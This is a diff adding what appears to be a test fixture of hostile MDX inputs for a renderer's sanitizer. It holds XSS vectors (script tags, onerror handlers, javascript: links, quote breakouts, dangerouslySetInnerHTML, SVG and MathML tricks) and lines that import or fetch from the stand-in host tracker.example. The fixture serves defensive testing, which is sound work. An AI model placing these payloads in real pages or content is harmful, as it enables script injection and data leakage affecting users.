@@ -1,0 +1,45 @@
+import evil from 'https://tracker.example/evil.js'
+export const run = fetch('https://tracker.example/export')
+
+# An article that tries to run
+%%%
+<script>{"window.__galeoPwned = 'script'"}</script>
+%%%
+<img src="x" onerror="window.__galeoPwned = 'onerror'" />
+%%%
+<a href="javascript:window.__galeoPwned = 'href'">click</a>
+%%%
+<a href="notes.md" onclick="window.__galeoPwned = 'onclick'">click</a>
+%%%
+<a title='"><img src=x onerror=window.__galeoPwned=1>'>a quote in a value</a>
+%%%
+<Foo label='"><img src=x onerror=window.__galeoPwned=1>' />
+%%%
+<Foo dangerouslySetInnerHTML={{ __html: '<img src=x onerror=window.__galeoPwned=1>' }} />
+%%%
+<Comp {...{ onClick: () => (window.__galeoPwned = 'spread') }} onClick={() => (window.__galeoPwned = 'prop')} />
+%%%
+{fetch('https://tracker.example/expression')}
+
+Inline {window.__galeoPwned = 'inline'} too.
+%%%
+<iframe src="https://tracker.example/frame" />
+%%%
+<div style="background: url(https://tracker.example/s.png)">styled by a string</div>
+%%%
+<div style={{ background: 'url(https://tracker.example/s.png)' }}>styled by an expression</div>
+%%%
+<img src="https://tracker.example/pixel.png" alt="a remote image" />
+%%%
+<svg><script>{"1"}</script><image href="https://tracker.example/s.png" /></svg>
+%%%
+<math><mi xlink:href="javascript:window.__galeoPwned=1">x</mi></math>
+%%%
+<base href="https://tracker.example/" />
+<link rel="stylesheet" href="https://tracker.example/s.css" />
+<meta httpEquiv="refresh" content="0;url=https://tracker.example/" />
+%%%
+<Callout>
+  <img src="x" onerror="window.__galeoPwned = 'nested'" />
+  <a href="javascript:window.__galeoPwned = 'nested'">nested</a>
+</Callout>
